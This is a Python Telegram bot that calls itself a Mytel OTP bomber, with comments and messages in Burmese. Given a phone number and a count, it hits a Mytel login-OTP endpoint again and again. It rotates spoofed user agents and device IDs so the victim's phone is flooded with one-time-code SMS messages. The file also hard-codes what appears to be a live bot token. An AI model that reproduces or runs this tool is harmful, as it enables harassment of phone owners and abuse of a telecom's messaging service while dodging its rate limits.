import telebot
from telebot import types
import requests
import time
import threading
import random
import uuid

# Bot Token ကို တိုက်ရိုက်ထည့်သွင်းထားပါသည်
TOKEN = '8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw'
bot = telebot.TeleBot(TOKEN)

# API Base URL
BASE_URL = "https://mytel.bubblepop.info/game-service/v1"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
    btn_help = types.InlineKeyboardButton("ℹ️ အကူအညီ", callback_data="menu_help")
    markup.add(btn_start, btn_help)
    
    bot.reply_to(message, "🤖 Mytel OTP Bomber Bot မှ ကြိုဆိုပါတယ်။\nအောက်ပါ ခလုတ်များကို အသုံးပြုနိုင်ပါသည် -", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "menu_start":
        bot.send_message(call.message.chat.id, "📱 ကျေးဇူးပြု၍ ဖုန်းနံပါတ်နှင့် အကြိမ်ရေကို ဤကဲ့သို့ ပို့ပေးပါ။\n\nဥပမာ: `/bomb 09912345678 10`", parse_mode="Markdown")
    elif call.data == "menu_help":
        bot.send_message(call.message.chat.id, "ℹ️ **အသုံးပြုပုံ ညွှန်ကြားချက်**\n\n- `/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>` ဟု ရိုက်ထည့်ပါ။\n- ဥပမာ: `/bomb 09912345678 10`\n- တစ်ကြိမ်လျှင် အများဆုံး အကြိမ် ၅၀ အထိ သတ်မှတ်ပေးထားပါသည်။", parse_mode="Markdown")

@bot.message_handler(commands=['bomb'])
def start_bombing(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ရိုက်ထည့်ပါ:\n`/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>`", parse_mode="Markdown")
        return

    phone_number = args[1]
    try:
        count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ အကြိမ်ရေသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    if count > 30:
        bot.reply_to(message, "⚠️ ဆာဗာ Cooldown ကန့်သတ်ချက်ကြောင့် အကြိမ်ရေကို အများဆုံး ၃၀ သို့ သတ်မှတ်ထားပါသည်။")
        count = 30

    msg = bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်\n⏳ Time Limit / Cooldown စနစ်ဖြင့် လုပ်ဆောင်နေပါသည်...", parse_mode="Markdown")

    # Thread စတင်ပြီး နောက်ကွယ်မှာ Time Limit နဲ့ အသစ်တောင်းစေခြင်း
    threading.Thread(target=run_bomber, args=(message.chat.id, msg.message_id, phone_number, count)).start()

def run_bomber(chat_id, msg_id, phone_number, count):
    success_count = 0
    fail_count = 0

    url = f"{BASE_URL}/user/loginOtp"

    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    ]

    for i in range(count):
        try:
            session = requests.Session()
            device_id = str(uuid.uuid4())
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "X-Request-ID": device_id,
                "X-Device-Id": device_id,
                "Origin": "https://mytel.bubblepop.info",
                "Referer": "https://mytel.bubblepop.info/"
            }
            
            payload = {
                "msisdn": phone_number,
                "uuid": device_id
            }
            
            response = session.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success_count += 1
            else:
                fail_count += 1
                
        except Exception as e:
            fail_count += 1

        # အကယ်၍ နောက်ဆုံးတစ်ကြိမ် မရောက်သေးရင် Time Limit (Cooldown) စောင့်ဆိုင်းချိန် ထည့်ပေးခြင်း 
        # (ဥပမာ- Mytel ဆာဗာ OTP ပို့ပြီးရင် နောက်တစ်ခါထပ်တောင်းလို့ရအောင် စက္ကန့် ၃၀ မှ ၄၅ စက္ကန့်အထိ အချိန်ခြားပေးခြင်း)
        if i < count - 1:
            cooldown_time = random.randint(30, 45) # လိုအပ်ပါက ဒီနေရာမှာ အချိန်ကို လျှော့နိုင် ချဲ့နိုင်ပါတယ်
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg_id,
                    text=f"🚀 လုပ်ဆောင်နေဆဲ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 ပြီးမြောက်မှု: `{i+1}/{count}` ကြိမ်\n⏳ Time Limit Cooldown: `{cooldown_time} စက္ကန့်` စောင့်ဆိုင်းနေသည်...",
                    parse_mode="Markdown"
                )
            except:
                pass
            
            time.sleep(cooldown_time)

    bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
